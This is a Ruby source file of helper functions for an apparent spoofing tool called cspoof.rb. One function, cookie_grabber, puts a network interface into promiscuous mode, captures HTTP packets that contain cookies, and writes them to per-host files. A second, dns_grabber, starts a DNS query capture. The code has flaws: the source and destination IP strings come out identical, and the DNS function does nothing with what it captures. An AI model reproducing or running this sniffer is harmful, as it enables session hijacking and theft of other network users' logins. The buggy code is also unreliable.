#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
include PacketFu

# This file contains the two functions that are used by the main program (cspoof.rb)

# dump the cookies to a file in verbose mode 
def puts_verbose(text, src_ip, dst_ip)
    #generate the filename
    user = File.open("cookie_#{src_ip}->#{dst_ip}.txt", "a") 
    puts "File opened: #{user.path}"
    user.puts "----------------------------------------------------"
    user.puts(text)
    user.close
end

# sniff the traffic and capture the cookie packets, and dump them to a file
def cookie_grabber()
  puts "Waiting for cookies............:"
  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true,
	:filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")

  capture_session.stream.each { |packet|
  if packet =~ /ookie/
    puts "cookie found!" 
    pkt = Packet.parse packet
	packet_info = [pkt.ip_saddr, pkt.ip_daddr]
	src_ip = "%s" % packet_info
	dst_ip = "%s" % packet_info
    puts_verbose(packet, src_ip, dst_ip)
    end
  }
end

def dns_grabber()
  puts "Waiting for queries:"
  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53", :save => true)
  puts "got one!"
end
